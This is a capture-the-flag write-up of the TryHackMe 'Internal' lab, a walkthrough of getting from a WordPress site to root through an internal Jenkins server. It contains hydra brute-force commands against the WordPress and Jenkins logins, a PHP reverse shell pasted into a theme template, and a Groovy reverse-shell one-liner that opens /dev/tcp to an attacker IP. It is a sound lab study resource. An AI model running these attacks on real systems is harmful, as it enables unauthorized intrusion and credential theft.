---
layout: post
title: Internal writeup
hide_title: false
color: grey
permalink: /ctf/thm-internal
#feature-img: 
#author: ickl0cc
tags: [Tryhackme , tunneling , jenkins , wp]
excerpt_separator: <!--more-->
---

<img src="/assets/img/thm/internal/title.png" width="417" height="120" ><br>
Difficulty: Hard

## Intro
Namaste everyone. This is my first [writeup](http://writeup.So).  So if there are any mistakes please feel free to reach out to me. Also thanks to TheMayor for creating this box. As a begineer into ctfs i really enjoyed solving this box.

Before we get started i wanna shed some light into the type of box we are dealing and short description of the attack. To get the userflag you need to exploit the wordpress site running at the specific directory. For root, you need to enumerate, find the local jenkins server bruteforce it and get a shell where you can get info for creds to ssh into root user.
<!--more-->
***

# Scanning and Enumeration

Before getting started put `internal.thm` in your `/etc/hosts` 

After the box is deployed lets scan the ip to see open ports
```bash
nmap -sC -sV -T4 -p- -v -oN nmap/fullscan internal.thm

```
Here are the open ports:
```console
Nmap scan report for internal.thm (10.10.119.154)
Host is up (0.43s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
The box has http and ssh server open.Let's enumerate port 80 first

### - Port 80

Looking at the site its a default apache page

<a href="/assets/img/thm/internal/apache.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/internal/apache.png"></a>

Nothing interesting came up so i resorted to my directory bruteforcing. Let's fireup our gobuster to see the directories of the site

```bash
gobuster dir -u http://internal.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobust
```
<a href="/assets/img/thm/internal/gobuster.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/internal/gobuster.png"></a>

There's a blog directory so lets see what it contains

<a href="/assets/img/thm/internal/wp.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/internal/wp.png"></a>

Its a wordpress website. I looked into the site and there's a classic hello world page. The first thing that came into mind is to run wpscan to see if there is any vulnerabilites of this wordpress site and enumerate the wordpress site. Its a great tool.

It comes preinstalled if you are using kali otherwise you can clone it from [github](https://github.com/wpscanteam/wpscan)

```bash
wpscan --url internal.thm/blog -e -v
```
`-e` means enumerate everything

`-v` is to verbose output and if you want to save the output you can use `-o` 

Use `-h` for help

<a href="/assets/img/thm/internal/wpusers.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/internal/wpusers.png"></a>

Looking at the results the Wordpress version is `5.4.2`  and it found one user admin. We know the username. At this moment i only had a username so lets bruteforce with hydra.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt internal.thm -V -f http-form-post '/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fi[32/32$
.thm%2Fblog%2Fwp-admin%2F&testcookie=1:S=Location
```
So it found the password. I don't want to spoil the password if you were looking for hints. Let's login inside `/blog/wp-admin`

## Exploitation

<a href="/assets/img/thm/internal/wp_dashboard.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/internal/wp_dashboard.png"></a>

The site is pretty new. Let's get a reverse shell so we can go deep inside the box. There are multiple ways to get reverse shell but we have the credentials so the one we are using is uploading our malicious code in `wp_theme`.To get the connection you need to upload the php reverse shell to the site. We can grab the php reverse shell from pentestmonkey. 

Go to `Apperance>Theme Editor > 404 template >` and paste the code there. Replace the ip with your attacker ip address and open up a listener in your machine.

<a href="/assets/img/thm/internal/wp-theme.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/internal/wp-theme.png"></a>

Update file and browse the following URL to run the injected php code.

`http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php`

<a href="/assets/img/thm/internal/wpreverse.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/internal/wpreverse.png"></a>
Once inside at first i did'nt looked at all the folders properly. Further looking inside there's a file in the `/opt`  named `wp-save.txt`

```console
www-data@internal:/opt$ ls -la
total 16
drwxr-xr-x  3 root root 4096 Aug  3 03:01 .
drwxr-xr-x 24 root root 4096 Aug  3 01:31 ..
drwx--x--x  4 root root 4096 Aug  3 03:01 containerd
-rw-r--r--  1 root root  138 Aug  3 02:46 wp-save.txt
www-data@internal:/opt$
```

Let's cat it out

```console
www-data@internal:/opt$ cat wp-save.txt 
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:[REDACTED]
www-data@internal:/opt$
```

We have two usernames `bill` and `aubreanna` . When we were doing nmap there was a ssh port open. The creds is the ssh details for `aubreanna`

```bash
ssh aubreanna@internal.thm
```

There you go. There's a user.txt file which contains the first flag

```bash
aubreanna@internal:~$ ls
jenkins.txt  snap  user.txt
```
## Priviledge Escalation
After enumerating this box i found that it has a internal port `8080` open. it didnt pop out in our nmap scan becuase it can be accessed only by localhost. We need to pivot to reach to that port.

```console
aubreanna@internal:~$ netstat -ntl
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:44727         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
aubreanna@internal:~$
```

We can create ssh tunnel and redirect all the traffic but this time i wanted to upload a socat [static binary](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/) and port forward. 

Create a `http-server` in your attacker machine and use `wget` to get the binary in the victim machine

<a href="/assets/img/thm/internal/socat.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/internal/socat.png"></a>

Change the permission to executable 

```bash
chmod +x socat
```

Let's port forward

```bash
./socat tcp-listen:8000,reuseaddr,fork tcp:localhost:8080
```

All tcp connections to port 8000 will be redirected to localhost at port 8080. Lets go the `internal.thm:8080` in our browser

<a href="/assets/img/thm/internal/jenkins.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/internal/jenkins.png"></a>

It's a jenkins server which is used to integrate and automate your product development and testing processes.But it's protected with login. I tried default creds and didnt work out. So we have to bruteforce it. Msfconsole has a auxillary to bruteforce it since the box mentions it can be solved without metsploit so we will use hydra.

The default username for jenkins is `admin` . If it won't work out then we do have other usernames `aubreanna`, `bill` to try . For now let's try with `admin`

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt internal.thm -s 8000 -f -V  http-post-form "/j_acegi_security_check:j_usern
ame=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:S=logout"
```
`-s` run at specific port

`f` stop on success

`V` Verbose every user:pass it tries to login

`S:` Find whatever in the page after successfully logged in

#<a href="/assets/img/thm/internal/.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/internal/.png"></a>

Let's login with the obatined creds at jenkins

<a href="/assets/img/thm/internal/jenkins_dashboard.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/internal/jenkins_dashboard.png"></a>

Once logged in we can generate a reverse shell in multiple ways. One of the ways is from script console which is `Manage Jenkins > Script Console`

<a href="/assets/img/thm/internal/jenkins_sc.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/internal/jenkins_sc.png"></a>

We can put Groovy script and run to execute it. Jenkins supports building Java projects since its inception, and for a reason! It’s both the language Jenkins is written in, plus the language in use . We can easily run a java reverse shell from [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) and get a connection back. 

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.4.0.140/1337;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

Replace the `<ip>` and `<port>` with your attacker ip and port

open a netcat listner and run the above code.

<a href="/assets/img/thm/internal/jenkinshell.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/internal/jenkinshell.png"></a>

Got a shell back.Yeah!!

run `bash -i` to get bash shell

Looking into it after sometime i found a file `note.txt` inside `/opt` 

```console
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:[REDACTED]
```

Let's ssh into root 

```bash
ssh root@internal.thm
```

let's list the files `ls -l`

```console
root@internal:~# ls -l
total 8
-rw-r--r-- 1 root root   22 Aug  3 04:13 root.txt
drwxr-xr-x 3 root root 4096 Aug  3 01:41 snap
root@internal:~#
```

Okay here's the final flag for the box inside `root.txt`

## Conclusion

Thanks for reading folks! I really enjoyed this box as it required manual enumeration rather than automated tools. At the end i thought it would be fun to exploit the jenkin server using the java deserialization and getting the root flag through there. Anyways i really liked it.













 






